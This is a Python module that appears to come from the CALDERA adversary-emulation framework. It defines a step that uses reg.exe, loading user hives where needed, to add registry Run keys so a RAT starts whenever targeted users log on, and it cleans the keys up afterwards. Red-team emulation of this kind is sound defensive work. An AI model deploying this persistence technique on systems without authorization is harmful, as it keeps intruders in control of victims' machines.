import logging

from plugins.adversary.app.commands import reg
from plugins.adversary.app.operation.operation import Step, OPUser, OPHost, OPRat, OPVar, OPPersistence, OPRegKey
from plugins.adversary.app.commands.errors import *

log = logging.getLogger(__name__)


class HKURunKeyPersist(Step):
    """
    Description:
        This step creates an entry in the registry under HKU\\<sid>\\Software\\Microsoft\\windows\\CurrentVersion\\Run
        in order to maintain persistence. This results in the RAT being executed whenever a targeted user logs on.
    Requirements:
        Requires enumeration of local profiles on the target machine (done using GetLocalProfiles), and an
        elevated RAT.
    """
    attack_mapping = [('T1060', 'Persistence'), ('T1106', 'Execution')]
    display_name = "hku_runkey_persist"
    summary = ("Use reg.exe to gain persistence by inserting run key values into local user profiles. This will cause "
               "the rat to be executed when any of the affected users logs on")

    preconditions = [("rat", OPRat({"elevated": True})),
                     ("host", OPHost(OPVar("rat.host"))),
                     ("user", OPUser({'$in': OPVar("host.local_profiles")}))]

    postconditions = [("regkey_g", OPRegKey({"host": OPVar("host")})),
                      ("persist_g", OPPersistence({"host": OPVar("host"), "user_context": OPVar("user"),
                                                   "elevated": False}))]

    significant_parameters = ["user", "host"]

    postproperties = ["persist_g.regkey_artifact",
                      "regkey_g.key", "regkey_g.value", "regkey_g.data"]

    @staticmethod
    def description(rat, host, user):
        return "Attempting to create a run key on {} for {}".format(host.hostname, user.username)

    @staticmethod
    async def simulate(operation, rat, host, user, regkey_g, persist_g):
        return True

    @staticmethod
    async def action(operation, rat, host, user, regkey_g, persist_g):
        value = "caldera"
        data = rat.executable

        u_profile_path = "C:\\Users\\{}\\ntuser.dat".format(user.username)  # Assumption: this is where profile path is.
                                                                # TODO: save this info in db during GetLocalProfiles
        u_key = "HKU\\{}".format(user.sid)

        #  Check if user's SID is already in HKU
        key_loaded = False
        relative_key = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        run_key = u_key + "\\" + relative_key
        loaded = False
        while not loaded:
            try:
                await operation.execute_shell_command(rat, *reg.add(key=run_key, value=value, data=data, force=True))
                loaded = True
            except IncorrectParameterError:  # Load user into HKU
                try:
                    await operation.execute_shell_command(rat, *reg.load(key=u_key, file=u_profile_path))
                    key_loaded = True
                except FileInUseError:
                    log.warning("The hive could not be loaded.")
                    return False

        if key_loaded:  # Unload key (if a key was loaded earlier)
            await operation.execute_shell_command(rat, *reg.unload(key=u_key.format(user.sid)))
            regkey = await regkey_g({'host': host, 'key': relative_key, 'value': value, 'data': data,
                                     'path_to_file': u_profile_path})
        else:
            regkey = await regkey_g({'key': run_key, 'value': value, 'data': data})

        await persist_g({'regkey_artifact': regkey})

        return True

    @staticmethod
    async def cleanup(cleaner, regkey_g):
        for regkey in regkey_g:
            await cleaner.delete(regkey)
